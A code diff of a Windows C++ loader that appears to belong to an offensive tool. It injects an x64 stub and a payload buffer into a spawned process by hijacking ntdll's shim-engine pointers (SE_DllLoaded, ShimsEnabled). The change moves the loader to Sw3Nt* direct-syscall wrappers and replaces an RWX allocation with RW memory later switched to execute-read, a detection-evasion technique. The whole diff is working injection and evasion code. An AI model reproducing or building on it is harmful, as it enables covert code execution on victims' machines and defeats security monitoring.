@@ -509,13 +509,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     LPVOID pSE_DllLoadedAddress = find_SE_DllLoadedAddress( hNtDLL, &pPtr );
     LPVOID pShimsEnabledAddress = find_ShimsEnabledAddress( hNtDLL, pPtr );
 
-	LPVOID pBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeof(x64_stub) + responseSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	LPVOID pBuffer;
+    SIZE_T sizeToAlloc = sizeof(x64_stub) + responseSize;
+    Sw3NtAllocateVirtualMemory_(pi.hProcess, &pBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-	// LPVOID pBuffer;
-	// SIZE_T sizeToAlloc = sizeof(x64_stub) + sizeof(x64_shellcode);
-	// Sw3NtAllocateVirtualMemory_(pi.hProcess, &pBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-	RtlCopyMemory( find_pattern(x64_stub, sizeof(x64_stub), "\x11\x11\x11\x11\x11\x11\x11\x11", 8), &pShimsEnabledAddress, sizeof(LPVOID) );
+    void* placeHolder = find_pattern(x64_stub, sizeof(x64_stub), (LPBYTE)"\x11\x11\x11\x11\x11\x11\x11\x11", 8);
+    if(placeHolder!=NULL)
+        RtlCopyMemory(placeHolder, &pShimsEnabledAddress, sizeof(LPVOID) );
 
 	Sw3NtWriteVirtualMemory_(pi.hProcess, pBuffer, x64_stub, sizeof(x64_stub)-1, NULL);
 	Sw3NtWriteVirtualMemory_(pi.hProcess, (LPVOID)((DWORD_PTR)pBuffer + sizeof(x64_stub)-1), response, responseSize, NULL);
@@ -528,7 +528,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     // getchar();
     // std::cout << "ResumeThread " << std::endl;
-	ResumeThread(pi.hThread);
+	ULONG oldAccess;
+    Sw3NtProtectVirtualMemory_(pi.hProcess, &pBuffer, &sizeToAlloc, PAGE_EXECUTE_READ, &oldAccess);
+
+    Sw3NtResumeThread_(pi.hThread, NULL);
     // DebugActiveProcessStop(pi.dwProcessId);
 
     if ( pi.hThread )
